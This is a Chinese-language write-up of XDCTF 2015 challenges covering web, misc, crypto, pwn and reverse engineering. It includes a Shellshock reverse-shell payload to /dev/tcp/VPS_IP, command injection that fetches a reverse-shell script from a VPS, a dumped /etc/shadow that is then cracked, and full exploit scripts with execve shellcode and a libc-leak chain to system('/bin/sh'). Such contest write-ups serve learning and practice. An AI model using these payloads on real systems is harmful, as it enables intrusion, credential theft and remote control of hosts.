<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/web1-400.jpg"><img class="alignnone size-full wp-image-38560" src="http://www.secpulse.com/wp-content/uploads/2015/10/web1-400.jpg" alt="web1-400" width="1359" height="425" /></a></p>
<h2 id="web2-200"><a href="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/writeup.html#web2-200" name="web2-200"></a>web2-200</h2>
<p>发现有<a href="http://www.secpulse.com/archives/6275.html" target="_blank">git泄露</a>，然后用脚本下载</p>
<pre class="bash hljs"><code class="bash" data-origin="&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;./rip-git.pl -v -u http://xdsec-cms-12023458.xdctf.win/ &lt;/code&gt;&lt;/pre&gt;">./rip-git.pl -v -u http://xdsec-cms-<span class="hljs-number">12023458</span>.xdctf.win/
</code></pre>
<p>然后恢复源码</p>
<pre class="bash hljs"><code class="bash" data-origin="&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;git log git reset -hard d16ecb1 &lt;/code&gt;&lt;/pre&gt;">git <span class="hljs-built_in">log</span>

git reset -hard d16ecb1
</code></pre>
<p>然后在index.php里面发现flag</p>
<pre><code data-origin="&lt;pre&gt;&lt;code&gt;Congratulation, this is the [XDSEC-CMS] flag 1 XDCTF-{raGWvWahqZjww4RdHN90} &lt;/code&gt;&lt;/pre&gt;">Congratulation, this is the [XDSEC-CMS] flag 1

XDCTF-{raGWvWahqZjww4RdHN90}
</code></pre>
<h2 id="web2-100"><a href="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/writeup.html#web2-100" name="web2-100"></a>web2-100</h2>
<p>看到了hint</p>
<pre><code data-origin="&lt;pre&gt;&lt;code&gt;100 前台逻辑漏洞，做出此题可获得进入300的钥匙 &lt;/code&gt;&lt;/pre&gt;">100 前台逻辑漏洞，做出此题可获得进入300的钥匙
</code></pre>
<p>然后又发现有人在ph这个用户里面发文章。觉得就是在找回密码这一块有问题，然后仔细看这一块的代码。<br />
发现两个关键点</p>
<pre class="php hljs"><code class="php" data-origin="&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;public function handle_resetpwd()     {         if(empty($_GET[&quot;email&quot;]) || empty($_GET[&quot;verify&quot;])) {             $this-&amp;gt;error(&quot;Bad request&quot;, site_url(&quot;auth/forgetpwd&quot;));         }         $user = $this-&amp;gt;user-&amp;gt;get_user(I(&quot;get.email&quot;), &quot;email&quot;);         if(I('get.verify') != $user['verify']) {             $this-&amp;gt;error(&quot;Your verify code is error&quot;, site_url('auth/forgetpwd'));         }         if($this-&amp;gt;input-&amp;gt;method() == &quot;post&quot;) {             $password = I(&quot;post.password&quot;);             if(!$this-&amp;gt;confirm_password($password)) {                 $this-&amp;gt;error(&quot;Confirm password error&quot;);             }             if(!$this-&amp;gt;complex_password($password)) {                 $this-&amp;gt;error(&quot;Password must have at least one alpha and one number&quot;);             }             if(strlen($password) &amp;lt; 8) {                 $this-&amp;gt;error(&quot;The Password field must be at least 8 characters in length&quot;);             }             $this-&amp;gt;user-&amp;gt;update_userinfo([                 &quot;password&quot; =&amp;gt; $password,                 &quot;verify&quot; =&amp;gt; null             ], $user[&quot;uid&quot;]);             $this-&amp;gt;success(&quot;Password update successful!&quot;, site_url(&quot;auth/login&quot;));         } else {             $url = site_url(&quot;auth/resetpwd&quot;) . &quot;?email={$user['email']}&amp;amp;verify={$user['verify']}&quot;;             $this-&amp;gt;view(&quot;resetpwd.html&quot;, [&quot;form_url&quot; =&amp;gt; $url]);         }     } &lt;/code&gt;&lt;/pre&gt;"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle_resetpwd</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"email"</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"verify"</span>])) {
            <span class="hljs-variable">$this</span>-&gt;error(<span class="hljs-string">"Bad request"</span>, site_url(<span class="hljs-string">"auth/forgetpwd"</span>));
        }
        <span class="hljs-variable">$user</span> = <span class="hljs-variable">$this</span>-&gt;user-&gt;get_user(I(<span class="hljs-string">"get.email"</span>), <span class="hljs-string">"email"</span>);
        <span class="hljs-keyword">if</span>(I(<span class="hljs-string">'get.verify'</span>) != <span class="hljs-variable">$user</span>[<span class="hljs-string">'verify'</span>]) {
            <span class="hljs-variable">$this</span>-&gt;error(<span class="hljs-string">"Your verify code is error"</span>, site_url(<span class="hljs-string">'auth/forgetpwd'</span>));
        }
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$this</span>-&gt;input-&gt;method() == <span class="hljs-string">"post"</span>) {
            <span class="hljs-variable">$password</span> = I(<span class="hljs-string">"post.password"</span>);
            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$this</span>-&gt;confirm_password(<span class="hljs-variable">$password</span>)) {
                <span class="hljs-variable">$this</span>-&gt;error(<span class="hljs-string">"Confirm password error"</span>);
            }
            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$this</span>-&gt;complex_password(<span class="hljs-variable">$password</span>)) {
                <span class="hljs-variable">$this</span>-&gt;error(<span class="hljs-string">"Password must have at least one alpha and one number"</span>);
            }
            <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">8</span>) {
                <span class="hljs-variable">$this</span>-&gt;error(<span class="hljs-string">"The Password field must be at least 8 characters in length"</span>);
            }
            <span class="hljs-variable">$this</span>-&gt;user-&gt;update_userinfo([
                <span class="hljs-string">"password"</span> =&gt; <span class="hljs-variable">$password</span>,
                <span class="hljs-string">"verify"</span> =&gt; <span class="hljs-keyword">null</span>
            ], <span class="hljs-variable">$user</span>[<span class="hljs-string">"uid"</span>]);
            <span class="hljs-variable">$this</span>-&gt;success(<span class="hljs-string">"Password update successful!"</span>, site_url(<span class="hljs-string">"auth/login"</span>));
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$url</span> = site_url(<span class="hljs-string">"auth/resetpwd"</span>) . <span class="hljs-string">"?email={$user['email']}&amp;verify={$user['verify']}"</span>;
            <span class="hljs-variable">$this</span>-&gt;view(<span class="hljs-string">"resetpwd.html"</span>, [<span class="hljs-string">"form_url"</span> =&gt; <span class="hljs-variable">$url</span>]);
        }
    }
</code></pre>
<p>在这个函数里面首先我们要过这个判断</p>
<pre class="php hljs"><code class="php" data-origin="&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;if(empty($_GET[&quot;email&quot;]) || empty($_GET[&quot;verify&quot;])) {             $this-&amp;gt;error(&quot;Bad request&quot;, site_url(&quot;auth/forgetpwd&quot;));         } &lt;/code&gt;&lt;/pre&gt;"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"email"</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"verify"</span>])) {
            <span class="hljs-variable">$this</span>-&gt;error(<span class="hljs-string">"Bad request"</span>, site_url(<span class="hljs-string">"auth/forgetpwd"</span>));
        }
</code></pre>
<p>email在源码中给出来了</p>
<pre><code class="html" data-origin="&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;meta name=&quot;author&quot; content=&quot;xdsec-cms@xdctf.com&quot;/&amp;gt; &lt;/code&gt;&lt;/pre&gt;">&lt;meta name="author" content="xdsec-cms@xdctf.com"/&gt;
</code></pre>
<p>然后verify这个是找回密码的一个验证key。其生成方式是md5(uniqid(mt_rand()))，开始想着是不是这个值可以预测，然后决定自己太天真了。我们继续往下面看代码</p>
<pre class="php hljs"><code class="php" data-origin="&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;$this-&amp;gt;user-&amp;gt;update_userinfo([                 &quot;password&quot; =&amp;gt; $password,                 &quot;verify&quot; =&amp;gt; null             ], $user[&quot;uid&quot;]); &lt;/code&gt;&lt;/pre&gt;"><span class="hljs-variable">$this</span>-&gt;user-&gt;update_userinfo([
                <span class="hljs-string">"password"</span> =&gt; <span class="hljs-variable">$password</span>,
                <span class="hljs-string">"verify"</span> =&gt; <span class="hljs-keyword">null</span>
            ], <span class="hljs-variable">$user</span>[<span class="hljs-string">"uid"</span>]);
</code></pre>
<p>这段代码说明，每次在找回密码之后都会把verify重置为NULL。好家伙，感觉问题的关键就在这里了。然后我自己写一段测试代码</p>
<pre class="php hljs"><code class="php" data-origin="&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php $conn = mysql_connect(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;&quot;); mysql_select_db(&quot;mysql&quot;, $conn); $sql1 = &quot;update &#96;user&#96; SET password = NULL where host = 'locathost' &quot;; $sql2 = &quot;select password from user where host='localhost' limit 1,1&quot;; mysql_query($sql1); $result = mysql_query($sql2); while($row = mysql_fetch_array($result))   {     var_dump($row['password']);   } $id = @$_GET['id']; if($id == $row['password']){   echo 'success'; } ?&amp;gt; &lt;/code&gt;&lt;/pre&gt;"><span class="hljs-preprocessor">&lt;?php</span>
<span class="hljs-variable">$conn</span> = mysql_connect(<span class="hljs-string">"127.0.0.1"</span>,<span class="hljs-string">"root"</span>,<span class="hljs-string">""</span>);

mysql_select_db(<span class="hljs-string">"mysql"</span>, <span class="hljs-variable">$conn</span>);

<span class="hljs-variable">$sql1</span> = <span class="hljs-string">"update `user` SET password = NULL where host = 'locathost' "</span>;

<span class="hljs-variable">$sql2</span> = <span class="hljs-string">"select password from user where host='localhost' limit 1,1"</span>;

mysql_query(<span class="hljs-variable">$sql1</span>);

<span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql2</span>);

<span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>))
  {
    var_dump(<span class="hljs-variable">$row</span>[<span class="hljs-string">'password'</span>]);
  }

<span class="hljs-variable">$id</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>];

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$id</span> == <span class="hljs-variable">$row</span>[<span class="hljs-string">'password'</span>]){

  <span class="hljs-keyword">echo</span> <span class="hljs-string">'success'</span>;

}
<span class="hljs-preprocessor">?&gt;</span>
</code></pre>
<p>当我id穿入一个空格的是时候打印的是success，这就证明php在做比较的时候把空格和NULL相等了。</p>
<p>然后回到CMS里面，我们将verify赋为空格，然后成功重置ph用户的密码。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/web2-100.jpg"><img class="alignnone size-full wp-image-38562" src="http://www.secpulse.com/wp-content/uploads/2015/10/web2-100.jpg" alt="web2-100" width="1077" height="345" /></a></p>
<p>&nbsp;</p>
<p>登录进去之后就发现了flag</p>
<p>其实发现网站上的源码和本地的源码不一样，因为我点击找回密码之后。应该生成了一个verify到数据，但是这个时候数据库的verify并没有生成。因为我通过空格还是成功修改了密码。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/web2-100-2.jpg"><img class="alignnone size-full wp-image-38564" src="http://www.secpulse.com/wp-content/uploads/2015/10/web2-100-2.jpg" alt="web2-100-2" width="1139" height="355" /></a></p>
<p>&nbsp;</p>
<h2 id="misc100">Misc100</h2>
<p>根据官方提示braiontools github下载下来，按照帮助手册<br />
<code>bftools.exe decode braincopter zzzzzyu.png --output --out.png</code><br />
根据提示上github找源码.. 编译之后 –help看一下使用方式<br />
两行命令就可以出flag</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/misc_100.jpg"><img class="alignnone size-full wp-image-38566" src="http://www.secpulse.com/wp-content/uploads/2015/10/misc_100.jpg" alt="misc_100" width="1136" height="78" /></a></p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/misc_100_2.jpg"><img class="alignnone size-full wp-image-38567" src="http://www.secpulse.com/wp-content/uploads/2015/10/misc_100_2.jpg" alt="misc_100_2" width="1136" height="93" /></a></p>
<h2 id="misc200"><a href="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/writeup.html#misc200" name="misc200"></a>Misc200</h2>
<p>提示是zip，查阅了资料大概是 zip已知明文攻击<br />
还原可以得到readme.txt的内容，接下来用</p>
<p><img class="alignnone size-full wp-image-38568" src="http://www.secpulse.com/wp-content/uploads/2015/10/misc-200-1.jpg" alt="misc-200-1" width="1026" height="198" /><br />
这个软件或者PKCrack都可以..<br />
得到flag</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/misc-200-2.jpg"><img class="alignnone size-full wp-image-38569" src="http://www.secpulse.com/wp-content/uploads/2015/10/misc-200-2.jpg" alt="misc-200-2" width="1137" height="156" /></a></p>
<h2>MISC500</h2>
<p>扫描 ctf.kfd.me 的端口,发现 31337 是服务端口,nc 连上之后看到提示:<br />
Do you know what's the most useful command in linux?<br />
可知道是 man 命令,man 命令的-P 参数可以执行其他命令.<br />
执行 man -P set &amp; 可以看到程序相关的逻辑代码:<br />
check_lenth ()<br />
{<br />
count=$(echo $1 | wc -m);<br />
if [[ $count -gt $2 ]]; then<br />
echo "Argument too long, 40 limit.";<br />
exit 2;<br />
fi<br />
}<br />
clean_up ()<br />
{<br />
if [[ -z $chat_room ]]; then<br />
cat bye;<br />
exit;<br />
else<br />
echo -e "\033[1;34m$msg_date\033[0m\033[1;31m $username<br />
\033[0m\033[1;34mleaved room\033[0m \033[1;36m \"$room_name\"<br />
\033[0m" &gt;&gt; $chat_room;<br />
cat bye;<br />
exit;<br />
fi<br />
}<br />
hander ()<br />
{<br />
m_cmd=$1;<br />
m_option=$2;<br />
m_selfcmd=$@;<br />
if [[ $m_cmd == 'man' ]]; then<br />
if [[ $m_option == '-P' ]]; then<br />
if [[ -n `echo $m_selfcmd | grep "\""` &amp;&amp; `echo $m_selfcmd<br />
| cut -d "\"" -f 3` != '' ]]; then<br />
m_selfcmd=`echo $m_selfcmd | cut -d "\"" -f 2`;<br />
else<br />
if [[ -n `echo $m_selfcmd | grep "'"` &amp;&amp; `echo $m_selfcmd<br />
| cut -d "'" -f 3` != '' ]]; then<br />
m_selfcmd=`echo $m_selfcmd | cut -d "'" -f 2`;<br />
else<br />
if [[ $3 == '' ]]; then<br />
echo "man: option requires an argument -- 'P'<br />
Try 'man --help' or 'man --usage' for more information.";<br />
fi;<br />
[[ $4 != '' ]] &amp;&amp; m_selfcmd=$3 || echo "What manual<br />
page do you want?";<br />
fi;<br />
fi;<br />
if [[ $m_selfcmd == 'whoami' ]]; then<br />
echo "root";<br />
else<br />
if [[ -n `echo $m_selfcmd | grep -E<br />
"vim|vi|sh|kill|pkill|socat|nc|ncat|nmap|rm|chmod|passwd|etc|root|exp<br />
ort|PATH"` ]]; then<br />
echo "No way.";<br />
else<br />
`$m_selfcmd &gt; m_return` &amp;&gt; /dev/null;<br />
cat m_return;<br />
fi;<br />
fi;<br />
else<br />
if [[ $m_option != '' ]]; then<br />
if [[ `man $m_option` == '' ]]; then<br />
echo "man: option requires an argument --'$m_option'<br />
Try 'man --help' or 'man --usage' for more information.<br />
";<br />
else<br />
`man $m_option &gt; tmp` &amp;&gt; /dev/null;<br />
cat tmp;<br />
fi;<br />
else<br />
echo "What manual page do you want?";<br />
fi;<br />
fi;<br />
else<br />
echo "invalid command";<br />
fi<br />
}<br />
分析代码后发现可以用 man -P "命令" &amp;的方式执行任意命令(前提是命令内容<br />
不能包含<br />
:vim|vi|sh|kill|pkill|socat|nc|ncat|<br />
nmap|rm|chmod|passwd|etc|root|export|PATH 这些字段)<br />
于是继续:<br />
man -P "ls -al" &amp; 可以看到有一个 flag?目录<br />
man -P "ls -al flag\?/" &amp; 可以看到 flag.php 的大小跟其他的不一样<br />
man -P "cat flag\?/flag.php" &amp; 可以看到 Oh, by the way, follow my shadow.<br />
的提示<br />
猜测是查看/etc/shadow 但是命令中不能包含 etc 字段,于是<br />
man -P "curl -o /tmp/1 xx.xx.xx.xx/1" &amp; 从我的 vps 上下载一个 python 的<br />
反弹 shell 的脚本.<br />
man -P "python /tmp/1" &amp; 执行脚本,成功拿到 shell<br />
通过反弹的 shell 查看/etc/shadow 得到:<br />
root:$6$ZuPfdsng$eN.xStmAbo5SCRQm9bHpA6wtrZisadNJn9lOE./2ks3C.vUVxnKJ<br />
AUIZM6PA7IEphcTgOzo4wOBz.wwD9CSDJ1:16709:0:99999:7:::<br />
daemon:*:16661:0:99999:7:::<br />
bin:*:16661:0:99999:7:::<br />
sys:*:16661:0:99999:7:::<br />
sync:*:16661:0:99999:7:::<br />
games:*:16661:0:99999:7:::<br />
man:*:16661:0:99999:7:::<br />
lp:*:16661:0:99999:7:::<br />
mail:*:16661:0:99999:7:::<br />
news:*:16661:0:99999:7:::<br />
uucp:*:16661:0:99999:7:::<br />
proxy:*:16661:0:99999:7:::<br />
www-data:*:16661:0:99999:7:::<br />
backup:*:16661:0:99999:7:::<br />
list:*:16661:0:99999:7:::<br />
irc:*:16661:0:99999:7:::<br />
gnats:*:16661:0:99999:7:::<br />
nobody:*:16661:0:99999:7:::<br />
libuuid:!:16661:0:99999:7:::<br />
syslog:*:16661:0:99999:7:::<br />
neighbor-old-wang:$6$5/yy2vJZ$Xp1MZOp4D5squxZLmgN4TLV5ktfUP2LD5Rp6l07<br />
lzyUCEES97px/a1EoIM8ZjygGrXdUDYGcoD9lGiCigosdI/:16710:0:99999:7:::<br />
ctf:$6$tcSIbi8j$lDog8sNj0U0m.LuAy8u/MRInv9UP33HQTcPhvHFfSTgDajN.4HGJo<br />
pG1PKMqOYVE7MdhDSlN6K/4DzNrEhy5D1:16709:0:99999:7:::<br />
sshd:*:16701:0:99999:7:::<br />
扔到 john 里跑一下,得到 neighbor-old-wang 的密码为 666666<br />
ssh 连上之后查看.bash_history 文件<br />
发现让从 www.flag.com 里面找 flag,<br />
从/etc/hosts 里发现 www.flag.com 指向的 172.17.0.1<br />
而本机是 172.17.0.4 不是一台机器<br />
于是 curl www.flag.com<br />
看到一段 JS 脚本:<br />
function status() {<br />
$.getJSON("/cgi-bin/status", function (data) {<br />
$.each( data, function( key, val ) {<br />
$('#infos').append ( "&lt;li&gt;&lt;b&gt;"+key+"&lt;/b&gt;: " + val +<br />
"&lt;/li&gt;" );<br />
});<br />
});<br />
}<br />
看到/cgi-bin/status,感觉是 Shellshock 漏洞,<br />
执行<br />
curl -H 'x: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/VPS_IP/8899 0&gt;&amp;1'<br />
http://www.flag.com/cgi-bin/status<br />
成功得到第二台主机的 shell<br />
cat /etc/passwd 得到最终 flag:<br />
xdctf{where_there_is_a_shell_there_is_a_way}</p>
<p>&nbsp;</p>
<h2>CRYPTO-200：</h2>
<p>字节翻转攻击，我们只需要构造出一个密文，使得密文的明文里面有;admin=true 即可，然<br />
而；被过滤了，所以要通过字节翻转攻击来构造出；。<br />
首先通过 parse 的字节递增来利用逻辑得到每一个 block 的大小为 16，然后他前置的字节数<br />
是 32 所以我们使输入的字节为：0admin=true，然后利用字节翻转攻击，在第二个 block 的<br />
第一个字节的值异或上’0’再亦或上’；’就可以达到在密文被解密的时候出现；admin=true 字<br />
样。</p>
<pre>__author__ = 'bibi'
#nc 133.130.52.128 6666
from zio import *
#io=zio(("133.130.52.128",6666))

def attack():
	prefix = "comment1=wowsuch%20CBC;userdata="#32
	suffix = ";coment2=%20suchsafe%20very%20encryptwowww"#42
	print len(prefix)
	print len(suffix)
	need="0admin=true"
	
	io=zio(("133.130.52.128",6666))
	io.write("mkprof:"+need+"\n")
	chushi=io.read_until("\n")
	print chushi
	
	e=chr(ord((chushi[16*2]+chushi[16*2+1]).decode("hex"))^ ord('0') ^
	ord(';')).encode("hex")
	print e
	cc=chushi[0:16*2]+e+chushi[16*2+2:-1]
	io=zio(("133.130.52.128",6666))
	io.write("parse:"+cc+"\n")
	io.read_until("\n")
	print len(chushi)/2
attack()
'''
for l in range(5,0xff):
	io=zio(("133.130.52.128",6666))
	test="aa"*l
	io.write("parse:"+test+"\n")
	io.read_until("\n")
	raw_input()
'''
#print len("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")/2
</pre>
<h2 id="pwn100">pwn100</h2>
<p>用瀚海源的 文件b超.<br />
<a href="https://b-chao.com/">https://b-chao.com/</a><br />
<img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/pwn100_1.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/pwn100_1.png"><img class="alignnone size-full wp-image-38570" src="http://www.secpulse.com/wp-content/uploads/2015/10/pwn100_1.png" alt="pwn100_1" width="1700" height="450" /></a></p>
<h2 id="pwn200"><a href="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/writeup.html#pwn200" name="pwn200"></a>pwn200</h2>
<p>漏洞很明显,但没有libc,之前想着dump内存,把libc dump出来的,没弄好,后来找了个模板改下了就好了.</p>
<p><a href="https://github.com/inaz2/roputils/blob/master/examples/dl-resolve-i386.py">dl-resolve-i386.py</a></p>
<h2 id="pwn300"><a href="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/writeup.html#pwn300" name="pwn300"></a>pwn300</h2>
<p>程序自己写了个堆管理,然后有个堆溢出.通过edit修改堆的类型即可覆盖下一个堆的结构,接着用del阔以修改4个字节.</p>
<p>利用的话:<br />
1:先修改存堆地址的那部分,0x0804b060,通过show_girl()来泄露堆地址<br />
2:在堆里放shellcode,然后修改got_exit()指向shellcode</p>
<p>&nbsp;</p>
<p>漏洞:<br />
在 edit 功能中可以重新设置新的 type 值，导致堆溢出。<br />
利用：<br />
这块堆是程序自己维护的堆。堆头部包含 12 字节,大致如下。<br />
struct heap_header<br />
{<br />
+0 size<br />
+4 *next<br />
+8 *prev<br />
}<br />
存在一个双链表，同时程序没有开启 NX，所以可以通过伪造堆头，在 delete 时实现任<br />
意地址写任意数据。<br />
Ps:程序在 delete 函数中有如下代码，不过感觉出题人写错了函数。堆头为 0xc 字节，<br />
V2=a1-0xc 才对。题目给出的程序连个正常的 delete 功能都没有。</p>
<p><a href="http://www.secpulse.com/wp-content/uploads/2015/10/pwn300.jpg"><img class="alignnone size-full wp-image-38583" src="http://www.secpulse.com/wp-content/uploads/2015/10/pwn300.jpg" alt="pwn300" width="614" height="181" /></a><br />
脚本如下：</p>
<pre>from zio import *
target = './pwn3'
target = ('133.130.90.210', 6666)


def add(io, type):
    io.read_until('ce:')
    io.writeline('1')
    io.read_until(':')
    io.writeline(str(type))
    
def edit(io, id, type, buf):
    io.read_until('ce:')
    io.writeline('3')
    io.read_until(':')
    io.writeline(str(id))
    io.read_until(':')
    io.writeline(str(type))
    io.read_until(':')
    io.write(buf)
    
def delete(io, id):
    io.read_until('ce:')
    io.writeline('2')
    io.read_until(':')
    io.writeline(str(id))
    
def show(io, id):
    io.read_until('ce:')
    io.writeline('4')
    io.read_until(':')
    io.writeline(str(id))
    io.read_until('bbbb')
    heap_ptr = l32(io.read(4))
    print hex(heap_ptr)
    return heap_ptr

def exp(target):
    #io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'),
    print_write=COLORED(REPR, 'green'))
    io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'),
    print_write=COLORED(RAW, 'green'))
    add(io, 0) #0x0804d01c
    add(io, 0) #0x0804d09c
    edit(io, 0, 1, 'a'*0x74+'bbbb')
    heap_ptr = show(io, 0)
    put_got = 0x0804B014
    shellcode3 = "\xeb\x1e"
    shellcode3 = shellcode3.ljust(0x20, 'a')
    shellcode3 +=
    "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\
    xcd\x80"
    shellcode3 = shellcode3.ljust(0x70, 'a')
    io.gdb_hint()
    edit(io, 0, 1, shellcode3+l32(0x81)+l32(heap_ptr-0x0804d110+0x0804d01c)+l32(put_got-4))
    delete(io, 1)
    io.interact()
exp(target)
</pre>
<h2 id="pwn400"><a href="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/writeup.html#pwn400" name="pwn400"></a>pwn400</h2>
<p>整型溢出<br />
如下图所示,在sub_8048c86()的函数调用中,v13 是个2字节的变量,并且是可控的,前面的判断逻辑即可使(v13+2)溢出来绕过<br />
<img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/pwn400_1.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/pwn400_1.png"><img class="alignnone size-full wp-image-38573" src="http://www.secpulse.com/wp-content/uploads/2015/10/pwn400_1.png" alt="pwn400_1" width="1460" height="272" /></a></p>
<p>在sub_8048c86中,这里传递n是一个大数,就阔以读取到flag了.<br />
<img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/pwn400_2.png" alt="" /><img class="alignnone size-full wp-image-38572" src="http://www.secpulse.com/wp-content/uploads/2015/10/pwn400_2.png" alt="pwn400_2" width="1352" height="918" /></p>
<p>脚本如下：</p>
<pre>from zio import *
	target = ('159.203.87.2', 8888)
	#target = ('127.0.0.1',8888)
def exp(target):
	#io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'),
	print_write=COLORED(REPR, 'green'))
	io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'),
	print_write=COLORED(RAW, 'green'))
	data = 'a'*0x15
	data += 'PK\x01\x02'
	data += 0x18*'a'
	data += l16(0xffff)
	data=data.ljust(0x45, 'a')
	io.writeline(data)
	io.interact()
</pre>
<h2>Pwn500</h2>
<p>漏洞：<br />
1. 在 take_exam 中， 程序创建了一个子进程来让用户输入 essay， 不过其中存在一个栈溢出。<br />
分配的空间大小为 96，但是最多能读入 104，溢出 8 个字节，只能覆盖到 rbp，并不能<br />
覆盖到 rip。同时子进程很快就调用 exit 退出了。看起来并没有什么卵用。但是如果因为<br />
栈溢出导致子进程提前崩溃，那么子进程写入到文件中的字节数将为 0。<br />
2. 在 resit 中，v3 对应结构体如下：<br />
struct exam_info{<br />
+0 type<br />
+4 real_len<br />
+8 want_len<br />
+16 *essay<br />
+24 sub_4013f0<br />
}<br />
程序调用 sub_4013f0处的函数， 里面如果考试成绩小于60， 就会将对应的 essay 内存 free<br />
掉。而当 real_len=0 时，*essay 指针不会被清 0，指向被释放的内存。而 real_len 为子进<br />
程写入文件中的字节个数，在栈溢出的情况下可以为 0.<br />
3. 通过 uaf 伪造 v3 结构，可以达到控制函数指针，同时能控制第一个参数所指向内存中的<br />
内容。<br />
使用 printf(“%11$p”)格式化，可以泄露栈上的 libc_start_main 函数。<br />
然后通过 system(“/bin/sh”)拿到 shell。<br />
Ps: v3 结构体实际只用到了 32 字节，但是程序申请大小时大小为 0x68，使得重新申请时，<br />
刚好能占用刚 free 的内存，实现 uaf。<br />
脚本如下：</p>
<pre>from zio import *
	target = './pwn5-jwc'
	target = ('128.199.232.78', 5432)
	
def register(io, name, intro):
	io.read_until('exit\n')
	io.writeline('1')
	io.read_until('\n')
	io.writeline(name)
	io.read_until('\n')
	io.writeline(intro)
	
def exam(io, len, essay):
	io.read_until('exit\n')
	io.writeline('2')
	io.read_until('dota\n')
	io.writeline('1')
	io.read_until('?\n')
	io.writeline(str(len))
	io.read_until('OK')
	io.write(essay)
	io.write('\n')
	
def resit(io):
	io.read_until('exit\n')
	io.writeline('5')
	io.read_until('dota\n')
	io.writeline('1')
	
def exam2(io, len, essay):
	io.read_until('exit\n')
	io.writeline('2')
	io.read_until('dota\n')
	io.writeline('2')
	io.read_until('?\n')
	io.writeline(str(len))
	io.read_until('OK')
	io.write(essay)
	io.write('\n')
	
def cheat(io, payload):
	io.read_until('exit\n')
	io.writeline('1024')
	io.writeline('1')
	io.writeline(payload)
	
def leak(io):
	io.read_until('exit\n')
	io.writeline('3')
	io.read_until('0\n')
	libc_main = int(io.read_until('english').split('english')[0], 16)
	print hex(libc_main)
	libc_base = -0x7ffff7a36ec5 + 0x00007ffff7a15000 + libc_main
	print hex(libc_base)
	return libc_base
	
def exp(target):
	#io = zio(target, timeout=10000, print_read=COLORED(REPR, 'red'),
	print_write=COLORED(REPR, 'green'))
	io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'),
	print_write=COLORED(RAW, 'green'))
	register(io, 'ling', 'abcd')
	exam(io, 104, 'a'*104)
	resit(io)
	exam2(io, 50, 'a'*50)
	payload = "%11$p"
	payload = payload.ljust(0x18,'\x00')
	payload += l64(0x00000000004009B0)
	cheat(io, payload)
	libc_base = leak(io)
	system = libc_base - 0x00007ffff7a15000 + 0x7ffff7a5b640
	print hex(system)
	payload = "/bin/sh;"
	payload = payload.ljust(0x18,'\x00')
	payload += l64(system)
	cheat(io, payload)
	io.writeline('3')
	io.interact()
	
exp(target)
</pre>
<h2 id="re100">Re100</h2>
<p>运行起来main函数有个ptrace反调试，修改返回值过了。之后输入的12位字符串 与”ZzAwZF9DcjRrM3JfZzBfb24=”循环异或再异或7，通过这个函数计算最后获得的返回是Congratulations? Key is XDCTF{Input}，是个问号，在.fini_array中还有一个相似的函数再进行一次验证，这次验证成功后会把问号改成感叹号，所以正在的验证 应该是.fini_array中的。而两个函数的差别就是第一个要异或7，.fini_array中的不异或7.</p>
<p><img src="file:///C:/Users/pc/Desktop/XDCTF2015/xdctf_writeup/writeup/syclover/img/1.png" alt="" /><a href="http://www.secpulse.com/wp-content/uploads/2015/10/Re100-1.png"><img class="alignnone size-full wp-image-38586" src="http://www.secpulse.com/wp-content/uploads/2015/10/Re100-1.png" alt="Re100-1" width="1133" height="365" /></a></p>
